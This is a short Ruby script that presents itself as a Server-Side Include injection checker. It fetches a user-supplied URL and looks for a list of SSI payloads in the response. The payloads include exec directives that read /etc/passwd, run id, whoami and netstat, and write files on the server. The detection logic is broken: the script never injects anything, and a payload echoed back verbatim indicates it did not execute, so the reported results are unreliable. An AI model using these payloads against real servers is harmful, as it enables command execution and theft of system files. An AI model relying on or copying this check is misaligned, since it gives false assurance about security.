require 'net/http'
require 'colorize'

# Function to send HTTP GET request and return response body
def send_get_request(url)
  uri = URI(url)
  response = Net::HTTP.get_response(uri)
  response.body
end

# Function to check if SSI is executed in response body
def check_ssi_injection(response_body)
  # Add SSI payloads here
  ssi_payloads = [
    "<!--#echo var=\"DOCUMENT_ROOT\" -->",
    "<!--#exec cmd=\"echo 'SSI executed'\" -->",
    "<!--#exec cmd=\"cat /etc/passwd\" -->",
    "<!--#config errmsg=\"SSI executed\" -->",
    "<!--#exec cmd=\"echo 'SSI executed' > /path/to/output.txt\" -->",
    "<!--#exec cmd=\"id\" -->",
    "<!--#exec cmd=\"uname -a\" -->",
    "<!--#exec cmd=\"net user\" -->",
    "<!--#exec cmd=\"echo 'SSI executed' | tee /path/to/output.txt\" -->",
    "<!--#exec cmd=\"ls -la\" -->",
    "<!--#exec cmd=\"whoami\" -->",
    "<!--#exec cmd=\"cat /etc/passwd | grep -v nologin\" -->",
    "<!--#exec cmd=\"netstat -an\" -->"
  ]
  
  # Check if any payload is present in the response body
  ssi_payloads.each do |ssi_payload|
    if response_body.include?(ssi_payload)
      puts "SSI Injection Vulnerability Found!".colorize(:red)
      puts "Payload Executed: #{ssi_payload}".colorize(:yellow)
      return
    end
  end

  puts "SSI Injection Vulnerability Not Found".colorize(:green)
end

# Ask user for target website URL
print "Enter your target website URL: "
target_url = gets.chomp

# Send HTTP GET request
response_body = send_get_request(target_url)

# Check for SSI Injection vulnerability
check_ssi_injection(response_body)
